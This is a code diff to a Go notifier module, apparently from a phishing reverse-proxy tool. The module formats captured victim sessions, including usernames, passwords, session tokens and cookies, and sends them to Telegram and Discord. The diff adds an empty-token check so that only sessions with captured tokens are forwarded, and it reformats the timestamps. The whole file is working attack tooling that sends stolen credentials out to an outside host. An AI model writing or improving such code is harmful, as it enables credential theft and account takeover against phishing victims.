@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"time"
 )
 
 func formatSessionMessage(session Session) string {
@@ -10,6 +11,12 @@ func formatSessionMessage(session Session) string {
 	httpTokensJSON, _ := json.MarshalIndent(session.HTTPTokens, "", "  ")
 	bodyTokensJSON, _ := json.MarshalIndent(session.BodyTokens, "", "  ")
 	customJSON, _ := json.MarshalIndent(session.Custom, "", "  ")
+
+	// 检查 tokensJSON 是否为空
+	if len(session.Tokens) == 0 {
+		fmt.Println("Tokens are empty, not sending the message.")
+		return ""
+	}
 
 	return fmt.Sprintf("✨ **Session Information** ✨\n\n"+
 		"👤 Username:      ➖ %s\n"+
@@ -24,8 +31,8 @@ func formatSessionMessage(session Session) string {
 
 		"🖥️ User Agent:    ➖ %s\n"+
 		"🌍 Remote Address:➖ %s\n"+
-		"🕒 Create Time:   ➖ %d\n"+
-		"🕔 Update Time:   ➖ %d\n",
+		"🕒 Create Time:   ➖ %s\n"+
+		"🕔 Update Time:   ➖ %s\n",
 		session.Username,
 		session.Password,
 		session.LandingURL,
@@ -38,8 +45,8 @@ func formatSessionMessage(session Session) string {
 		session.SessionID,
 		session.UserAgent,
 		session.RemoteAddr,
-		session.CreateTime,
-		session.UpdateTime,
+		time.Unix(session.CreateTime, 0).Format("2006-01-02 15:04:05"),  // Inline conversion
+		time.Unix(session.UpdateTime, 0).Format("2006-01-02 15:04:05"),  // Inline conversion
 	)
 }
 
@@ -48,14 +55,19 @@ func Notify(session Session) {
 	if err != nil {
 		fmt.Println(err)
 	}
+
 	message := formatSessionMessage(session)
+	if message == "" {
+		fmt.Println("Message is empty, no notification sent.")
+		return // 不发送消息
+	}
+
 	fmt.Printf("------------------------------------------------------\n")
 	fmt.Printf("Latest Session:\n")
 	fmt.Printf(message)
 	fmt.Printf("------------------------------------------------------\n")
 
 	if config.TelegramEnable {
-
 		sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message)
 		if err != nil {
 			fmt.Printf("Error sending Telegram notification: %v\n", err)
@@ -71,6 +83,5 @@ func Notify(session Session) {
 
 	if config.DiscordEnable {
 		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message)
-
 	}
 }
